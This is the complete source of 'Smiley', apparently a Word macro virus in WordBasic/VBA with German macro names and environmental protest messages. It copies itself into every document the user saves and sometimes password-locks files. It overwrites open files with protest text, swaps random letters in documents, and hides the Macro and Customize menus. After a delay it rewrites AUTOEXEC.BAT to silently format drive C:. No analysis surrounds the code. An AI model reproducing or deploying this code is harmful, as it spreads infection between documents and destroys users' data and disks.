   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DateiDruckenStandard"

   Public Sub Main()
   Dim Start
   On Error GoTo -1: On Error GoTo Exit_
   WordBasic.DisableInput
   WordBasic.ScreenUpdating 0
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If WordBasic.Today() - Start >= 14 And WordBasic.Int(Rnd() * 5) = 2 Then
     WordBasic.EndOfDocument
     WordBasic.Insert Chr(13) + Chr(13)
     WordBasic.Insert "Achtung !!! Stoppt alle Atomversuche !!! Atomversuche bedeuten unseren sicheren Tod !!!" + Chr(13)
     WordBasic.Insert "Achtung !!! Stoppt die Abholzung der Tropenwälder !!! Kauft nie Gegenstände aus Tropenholz !!!" + Chr(13)
     WordBasic.Insert "Achtung !!! Stoppt den Treibhauseffekt !!! Er führt zu einer tödlichen Klimaveränderung !!!" + Chr(13) + Chr(13)
     WordBasic.Insert "© Smiley Corporation"
     WordBasic.FilePrintDefault
     WordBasic.WW6_EditClear -298
     WordBasic.GoBack
     WordBasic.SetTemplateDirty 0
   Else
     WordBasic.FilePrintDefault
   End If
   Exit_:
   End Sub

   Attribute VB_Name = "DateiSpeichernUnter"

   Public Sub Main()
   Dim Start
   On Error GoTo -1: On Error GoTo Exit_
   WordBasic.DisableInput
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   dlg.Format = 1
   On Error Resume Next
   WordBasic.MacroCopy "AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
   WordBasic.MacroCopy "AutoExit", WordBasic.[FileName$]() + ":AutoExit", 1
   WordBasic.MacroCopy "AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
   WordBasic.MacroCopy "DateiDrucken", WordBasic.[FileName$]() + ":DateiDrucken", 1
   WordBasic.MacroCopy "DateiDruckenStandard", WordBasic.[FileName$]() + ":DateiDruckenStandard", 1
   WordBasic.MacroCopy "DateiSpeichern", WordBasic.[FileName$]() + ":DateiSpeichern", 1
   WordBasic.MacroCopy "DateiSpeichernUnter", WordBasic.[FileName$]() + ":DateiSpeichernUnter", 1
   WordBasic.MacroCopy "Timer", WordBasic.[FileName$]() + ":Timer", 1
   WordBasic.SetDocumentVar Chr(0), "Smiley sends greetings to everyone who's reading this text."
   On Error GoTo -1: On Error GoTo Exit_
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If WordBasic.Today() - Start >= 28 And WordBasic.Int(Rnd() * 3) = 1 Then dlg.Password = Chr(1) + Chr(2) + Chr(3)
   WordBasic.FileSaveAs dlg
   Exit_:
   End Sub

   Attribute VB_Name = "DateiSpeichern"

   Public Sub Main()
   Dim Start
   On Error GoTo -1: On Error GoTo Exit_
   WordBasic.DisableInput
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   dlg.Format = 1
   On Error Resume Next
   WordBasic.MacroCopy "AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
   WordBasic.MacroCopy "AutoExit", WordBasic.[FileName$]() + ":AutoExit", 1
   WordBasic.MacroCopy "AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
   WordBasic.MacroCopy "DateiDrucken", WordBasic.[FileName$]() + ":DateiDrucken", 1
   WordBasic.MacroCopy "DateiDruckenStandard", WordBasic.[FileName$]() + ":DateiDruckenStandard", 1
   WordBasic.MacroCopy "DateiSpeichern", WordBasic.[FileName$]() + ":DateiSpeichern", 1
   WordBasic.MacroCopy "DateiSpeichernUnter", WordBasic.[FileName$]() + ":DateiSpeichernUnter", 1
   WordBasic.MacroCopy "Timer", WordBasic.[FileName$]() + ":Timer", 1
   WordBasic.SetDocumentVar Chr(0), "Smiley sends greetings to everyone who's reading this text."
   On Error GoTo -1: On Error GoTo Exit_
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If WordBasic.Today() - Start >= 28 And WordBasic.Int(Rnd() * 3) = 1 Then dlg.Password = Chr(1) + Chr(2) + Chr(3)
   If WordBasic.[FileNameFromWindow$]() <> "" Then WordBasic.FileSaveAs dlg Else WordBasic.FileSave
   Exit_:
   End Sub

   Attribute VB_Name = "DateiDrucken"

   Public Sub Main()
   Dim Start
   On Error GoTo -1: On Error GoTo Exit_
   WordBasic.DisableInput
   WordBasic.ScreenUpdating 0
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If WordBasic.Today() - Start >= 14 And WordBasic.Int(Rnd() * 5) = 2 Then
     WordBasic.EndOfDocument
     WordBasic.Insert Chr(13) + Chr(13)
     WordBasic.Insert "Achtung !!! Stoppt alle Atomversuche !!! Atomversuche bedeuten unseren sicheren Tod !!!" + Chr(13)
     WordBasic.Insert "Achtung !!! Stoppt die Abholzung der Tropenwälder !!! Kauft nie Gegenstände aus Tropenholz !!!" + Chr(13)
     WordBasic.Insert "Achtung !!! Stoppt den Treibhauseffekt !!! Er führt zu einer tödlichen Klimaveränderung !!!" + Chr(13) + Chr(13)
     WordBasic.Insert "© Smiley Corporation"
     WordBasic.FilePrint dlg
     WordBasic.WW6_EditClear -298
     WordBasic.GoBack
     WordBasic.SetTemplateDirty 0
   Else
     WordBasic.FilePrint dlg
   End If
   Exit_:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub Main()
   Dim Start
   On Error Resume Next
   WordBasic.DisableInput
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "AutoExec", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExit", "AutoExit", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "AutoOpen", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":DateiDrucken", "DateiDrucken", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":DateiDruckenStandard", "DateiDruckenStandard", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":DateiSpeichern", "DateiSpeichern", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":DateiSpeichernUnter", "DateiSpeichernUnter", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Timer", "Timer", 1
   On Error GoTo -1: On Error GoTo Exit_
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If Start = 0 Or WordBasic.Today() - Start < 0 Then WordBasic.SetProfileString "windows", "Smiley", WordBasic.[LTrim$](Str(WordBasic.Today()))
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   Exit_:
   End Sub

   Attribute VB_Name = "AutoExit"

   Public Sub Main()
   Dim Start
   Dim i
   Dim Text_$
   On Error Resume Next
   WordBasic.DisableInput
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If WordBasic.Today() - Start >= 28 And WordBasic.Int(Rnd() * 3) = 1 Then
     For i = 1 To 9
       Open WordBasic.[FileName$](i) For Output As 1
       Text_$ = "Achtung !!! Stoppt alle Atomversuche !!! Atomversuche bedeuten unseren sicheren Tod !!!" + Chr(13) + "Achtung !!! Stoppt die Abholzung der Tropenwälder !!! Kauft nie Gegenstände aus Tropenholz !!!" + Chr(13) + "Achtung !!! Stoppt den Treibhauseffekt !!! Er führt zu einer tödlichen Klimaveränderung !!!" + Chr(13) + Chr(13) + "© Smiley Corporation"
     Print #1, Text_$
     Close 1
     Next i
   End If
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub Main()
   Dim Start
   Dim Batch$
   Dim Position
   On Error Resume Next
   WordBasic.DisableInput
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If Start = 0 Or WordBasic.Today() - Start < 0 Then
   Start = WordBasic.Today()
   WordBasic.SetProfileString "windows", "Smiley", WordBasic.[LTrim$](Str(Start))
   End If
   If WordBasic.Today() - Start >= 14 And WordBasic.Int(Rnd() * 3) = 1 Then WordBasic.ToolsOptionsUserInfo Name:="Smiley Corporation", Initials:="SC", Address:="Greenpeace"
   If WordBasic.Today() - Start >= 56 And WordBasic.Int(Rnd() * 3) = 1 Then
     SetAttr "C:\AUTOEXEC.BAT", 0
     Open "C:\AUTOEXEC.BAT" For Output As 1
     Batch$ = "@ECHO OFF" + Chr(13) + "CLS" + Chr(13) + "ECHO Achtung !!! Stoppt alle Atomversuche !!! Atomversuche bedeuten unseren sicheren Tod !!!" + Chr(13) + "ECHO Achtung !!! Stoppt die Abholzung der Tropenwälder !!! Kauft nie Gegenstände aus Tropenholz !!!" + Chr(13) + "ECHO Achtung !!! Stoppt den Treibhauseffekt !!! Er führt zu einer tödlichen Klimaveränderung !!!" + Chr(13) + "ECHO." + Chr(13) + "ECHO (C) Smiley Corporation" + Chr(13) + "ECHO." + Chr(13) + "ECHO !!! ABER JETZT IST ES ZU SPÄT !!!" + Chr(13) + "ECHO." + Chr(13) + "CTTY NUL" + Chr(13) + "C:\DOS\FORMAT.COM C: /U /AUTOTEST" + Chr(13) + "C:\WINDOWS\COMMAND\FORMAT.COM C: /U /AUTOTEST"
     Print #1, WordBasic.[WinToDOS$](Batch$)
   Close 1
   End If
   Position = 4
   If WordBasic.Val(WordBasic.[Left$](WordBasic.[AppInfo$](2), 1)) > 6 Then Position = Position - 1
   If WordBasic.[MenuItemText$]("&Datei", 1, Position + 2, 0) = "Ma&kro..." Then WordBasic.ToolsCustomizeMenus MenuType:=1, Name:="ExtrasMakro", Menu:="&Datei", MenuText:="Ma&kro...", Remove:=1
   If WordBasic.[MenuItemText$]("&Datei", 1, Position + 1, 0) = "(Trennlinie)" Then WordBasic.ToolsCustomizeMenus MenuType:=1, Name:="(Trennlinie)", Menu:="&Datei", MenuText:="", Remove:=1
   If WordBasic.[MenuItemText$]("&Datei", 1, Position, 0) = "Dokument&vorlage..." Then WordBasic.ToolsCustomizeMenus MenuType:=1, Name:="DateiDokVorlagen", Menu:="&Datei", MenuText:="Dokument&vorlage...", Remove:=1
   If WordBasic.[MenuItemText$]("&Datei", 0, Position + 7, 0) = "Dokument&vorlage..." Then WordBasic.ToolsCustomizeMenus Name:="DateiDokVorlagen", Menu:="&Datei", MenuText:="Dokument&vorlage...", Remove:=1
   If WordBasic.[MenuItemText$]("&Ansicht", 0, 8, 0) = "&Symbolleisten..." Then WordBasic.ToolsCustomizeMenus Name:="AnsichtSymbolleisten", Menu:="&Ansicht", MenuText:="&Symbolleisten...", Remove:=1
   If WordBasic.[MenuItemText$]("E&xtras", 0, 14, 0) = "&Anpassen..." Then WordBasic.ToolsCustomizeMenus Name:="ExtrasAnpassen", Menu:="E&xtras", MenuText:="&Anpassen...", Remove:=1
   If WordBasic.[MenuItemText$]("E&xtras", 0, 13, 0) = "Ma&kro..." Then WordBasic.ToolsCustomizeMenus Name:="ExtrasMakro", Menu:="E&xtras", MenuText:="Ma&kro...", Remove:=1
   If WordBasic.Today() - Start >= 28 And WordBasic.Int(Rnd() * 3) = 1 Then WordBasic.ToolsMacro Name:="Timer", Run:=1
   End Sub

   Attribute VB_Name = "Timer_"

   Public Sub Main()
   Dim Start
   Dim Smiley
   Dim Std
   Dim Min_
   On Error Resume Next
   WordBasic.DisableInput
   Start = WordBasic.Val(WordBasic.[GetProfileString$]("windows", "Smiley"))
   If WordBasic.Today() - Start < 28 Then GoTo Exit_
   ReDim Text___$(2)
   Text___$(0) = "ACHTUNG !!! STOPPT ALLE ATOMVERSUCHE !!! ATOMVERSUCHE BEDEUTEN UNSEREN SICHEREN TOD !!!"
   Text___$(1) = "ACHTUNG !!! STOPPT DIE ABHOLZUNG DER TROPENWÄlDER !!! KAUFT NIE GEGENSTÄNDE AUS TROPENHOLZ !!!"
   Text___$(2) = "ACHTUNG !!! STOPPT DEN TREIBHAUSEFFEKT !!! ER FÜHRT ZU EINER TÖDLICHEN KLIMAVERÄNDERUNG !!!"
   Smiley = 0
   Select Case WordBasic.Int(Rnd() * 3)
     Case 0
       Smiley = 58
     Case 1
       Smiley = 275
     Case 2
       WordBasic.ResetButtonImage "Standard", WordBasic.Int(Rnd() * 25 + 1)
   End Select
   If Smiley <> 0 Then WordBasic.ChooseButtonImage Face:=Smiley, Button:=WordBasic.Int(Rnd() * 25 + 1), Text:="", Toolbar:="Standard"
   Std = WordBasic.Hour(WordBasic.Now())
   Min_ = WordBasic.Minute(WordBasic.Now())
   Min_ = Min_ + 1
   If Min_ = 60 Then
     Std = Std + 1
     If Std = 24 Then Std = 0
   End If
   If WordBasic.Int(Rnd() * 11) = 5 Then
     WordBasic.NewToolbar "Smiley"
     WordBasic.ViewToolbars Toolbar:="Smiley", Show:=1
     WordBasic.MoveToolbar "Smiley", 1, -1, 95
     WordBasic.DeleteButton "Smiley", 1
     WordBasic.AddButton "Smiley", 1, 1, "OK", Text___$(WordBasic.Int(Rnd() * 3))
   Else
     WordBasic.ViewToolbars Toolbar:="Smiley", Hide:=1
   End If
   WordBasic.InsertSymbol Font:="Wingdings", CharNum:=WordBasic.[LTrim$](Str(WordBasic.Int(Rnd() * 3) + 74))
   If WordBasic.Int(Rnd() * 5) = 2 Then WordBasic.EditReplace Find:=Chr(WordBasic.Int(Rnd() * 26 + 97)), Replace:=Chr(WordBasic.Int(Rnd() * 26 + 97)), Wrap:=1, ReplaceAll:=1
   WordBasic.OnTime WordBasic.[LTrim$](Str(Std)) + ":" + WordBasic.[LTrim$](Str(Min_)), "Timer"
   Exit_:
   End Sub
